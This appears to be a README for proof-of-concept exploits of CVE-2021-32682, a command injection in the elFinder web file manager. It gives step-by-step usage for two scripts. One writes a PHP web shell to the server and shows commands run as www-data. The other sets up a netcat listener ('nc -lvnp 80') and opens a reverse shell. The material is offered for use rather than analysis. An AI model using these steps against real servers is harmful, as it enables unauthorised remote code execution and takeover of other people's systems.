# elFinder ZIP Arguments Injection Leads to Commands Injection (CVE-2021-32682)
## Some POCs for CVE-2021-32682

## Usage

Since the vulnerability is a command injection we can write a web shell to a php file. This relies on if the server executes php.

* Create file 1.txt
* Right-click 'Create archive' -> 'Zip archive'
* Rename archive to '2.zip'
* Execute exploit


      # python3 webshell.py http://<url>:8080/<elfinder url>/
      Status code  200
      [+] Webshell successfully written!!
      Usage: http://<url>:8080/<elfinder url>/files/shell.php?cmd=<whoami>

      # curl 'http://<url>:8080/<elfinder url>/files/shell.php?cmd=id'
      uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                      


We can also just execute a reverse shell with the command injection

* Create file 1.txt
* Right-click 'Create archive' -> 'Zip archive'
* Rename archive to '2.zip'
* Start netcat listener `nc -lvnp 80`
* Execute exploit


      # python3 reverse_shell.py <lhost> <lport> http://<url>:8080/<elfinder url>/

Wait for incoming reverse shell



### Credits
https://github.com/vulhub/vulhub/tree/master/elfinder/CVE-2021-32682

https://www.sonarsource.com/blog/elfinder-case-study-of-web-file-manager-vulnerabilities/

